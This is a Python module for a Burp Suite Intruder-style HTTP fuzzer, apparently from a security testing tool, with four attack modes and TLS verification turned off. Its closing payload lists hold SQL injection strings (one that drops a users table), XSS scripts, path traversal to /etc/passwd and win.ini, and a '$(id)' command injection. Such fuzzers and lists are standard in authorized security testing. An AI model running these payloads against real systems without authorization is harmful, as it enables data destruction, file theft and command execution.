"""
BurpSuite Intruder equivalent — payload-based fuzzer.

Attack types:
  sniper        — one payload list, inject into each position separately (M*N requests)
  battering_ram — one payload list, same payload fills all positions (N requests)
  pitchfork     — multiple payload lists, parallel fill (zip) — stops at shortest
  cluster_bomb  — multiple payload lists, cartesian product — all combinations

Positions are marked with § delimiters in the template, e.g.:
  POST /login?user=§admin§ HTTP/1.1
  ...
  password=§secret§

Results stored in intruder_results DB table.
"""
import threading
import time
import itertools
import re
import logging

logger = logging.getLogger("ids_ips")

_POSITION_RE = re.compile(r"§([^§\n]*)§")


# ── Template helpers ──────────────────────────────────────────────────────────

def positions_in(template: str) -> list:
    """Return count of § positions in template."""
    return len(_POSITION_RE.findall(template))


def fill(template: str, values: list) -> str:
    """Replace § positions in template with values list."""
    matches = list(_POSITION_RE.finditer(template))
    if not matches:
        return template
    result = template
    offset = 0
    for i, m in enumerate(matches):
        val = str(values[i]) if i < len(values) else m.group(1)
        s, e = m.start() + offset, m.end() + offset
        result = result[:s] + val + result[e:]
        offset += len(val) - (e - s)
    return result


def _build_combos(attack_type: str, payload_sets: list, n_pos: int) -> list:
    if not payload_sets:
        return []
    if attack_type == "sniper":
        combos = []
        defaults = [f"§pos{i}§" for i in range(n_pos)]
        for pos_i in range(n_pos):
            for payload in payload_sets[0]:
                vals = defaults[:]
                vals[pos_i] = payload
                combos.append(vals)
        return combos
    if attack_type == "battering_ram":
        return [[p] * n_pos for p in payload_sets[0]]
    if attack_type == "pitchfork":
        return [list(row) for row in zip(*payload_sets)]
    if attack_type == "cluster_bomb":
        return [list(row) for row in itertools.product(*payload_sets)]
    return []


# ── HTTP request executor ─────────────────────────────────────────────────────

def _execute(session, method: str, url: str, body: str, headers: dict, timeout: float) -> dict:
    try:
        t0 = time.time()
        r = session.request(
            method, url,
            data=body.encode() if body else None,
            headers=headers,
            timeout=timeout,
            allow_redirects=False,
            verify=False,
        )
        elapsed = (time.time() - t0) * 1000
        return {
            "status": r.status_code,
            "length": len(r.content),
            "time_ms": round(elapsed, 1),
            "resp_headers": dict(r.headers),
            "body_preview": r.text[:512],
        }
    except Exception as exc:
        return {"status": 0, "length": 0, "time_ms": 0, "error": str(exc)}


# ── Main attack runner ────────────────────────────────────────────────────────

def run_attack(
    method: str,
    url: str,
    body_template: str,
    headers: dict,
    attack_type: str,
    payload_sets: list,
    max_requests: int = 500,
    timeout: float = 10.0,
    concurrency: int = 10,
    on_result=None,
) -> dict:
    """
    Run an Intruder attack.

    Returns:
        {attack_type, total, results: [{index, payload, url, status, length, time_ms, ...}]}

    on_result(result_dict) is called for each completed request (optional, e.g. for streaming).
    """
    import warnings
    warnings.filterwarnings("ignore")

    try:
        import requests as _req
        session = _req.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 (Intruder/1.0; Security-Audit)"})
        session.headers.update(headers or {})
    except ImportError:
        return {"error": "requests library required"}

    n_pos = max(positions_in(url), positions_in(body_template or ""))
    combos = _build_combos(attack_type, payload_sets or [[]], n_pos)[:max_requests]

    if not combos:
        return {"error": "No payloads or positions found"}

    results = []
    lock = threading.Lock()
    sem = threading.Semaphore(concurrency)

    def _run(idx: int, vals: list):
        sem.acquire()
        try:
            filled_url = fill(url, vals)
            filled_body = fill(body_template or "", vals)
            r = _execute(session, method.upper(), filled_url, filled_body,
                         {}, timeout)
            entry = {"index": idx, "payload": vals, "url": filled_url, **r}
            with lock:
                results.append(entry)
            if on_result:
                try:
                    on_result(entry)
                except Exception:
                    pass
        finally:
            sem.release()

    threads = [threading.Thread(target=_run, args=(i, v), daemon=True)
               for i, v in enumerate(combos)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=timeout + 10)

    results.sort(key=lambda x: x.get("index", 0))

    summary = {
        "attack_type": attack_type,
        "method": method.upper(),
        "url": url,
        "total": len(results),
        "results": results,
        "timestamp": time.time(),
    }

    # Persist to DB
    try:
        from db.database import Database
        Database.get().save_intruder_run(summary)
    except Exception:
        pass

    return summary


# ── Built-in payload lists ────────────────────────────────────────────────────

PAYLOADS = {
    "sqli_basic": [
        "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        "admin'--", "' OR 'x'='x", "1 AND SLEEP(0)--",
        "' UNION SELECT NULL--", "1; DROP TABLE users--",
    ],
    "xss_basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "lfi_basic": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "..\\..\\windows\\win.ini", "/etc/passwd",
    ],
    "fuzz_common": [
        "", "null", "undefined", "0", "-1", "9999999", "true", "false",
        "admin", "test", "<>\"'", "../../etc/passwd", "$(id)", "%00",
    ],
    "numbers_1_100": [str(i) for i in range(1, 101)],
    "alpha_lower": list("abcdefghijklmnopqrstuvwxyz"),
}
